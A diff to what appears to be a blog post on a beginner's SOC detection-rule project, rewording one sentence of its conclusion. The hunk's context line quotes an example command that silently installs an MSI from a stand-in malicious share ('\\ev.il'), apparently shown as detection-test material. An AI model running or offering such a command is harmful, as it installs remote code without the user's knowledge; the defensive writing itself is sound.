@@ -121,7 +121,7 @@ msiexec -i \\ev.il\install.msi /qn /quiet  # valid, installs program from remote
 
 # Conclusion
 
-As a beginner in defensive security, this side-project helped me to gain more insight into the intricate world of SOC. My only regret is how much time I spent just failing to setup Elastic. Regardless, I recommend anyone interested in blue teaming or red teaming do this project as well. Any red teamer should understand the SOC's side and any blue teamer should be familiar with detection rules, false-positives, and false-negatives.
+As a beginner in defensive security, this side-project helped me to gain more insight into the intricate world of SOC. My only regret is how much time I spent just failing to setup Elastic. Regardless, I recommend anyone interested in blue teaming or red teaming do this project as well. Any red teamer should understand the SOC's side of things and any blue teamer should be familiar with detection rules, false-positives, and false-negatives.
 
 And that's it. Hope you gained something out of this post. As always, if you have questions, criticisms, or just want to reach out, you know how to find my contact details.
 
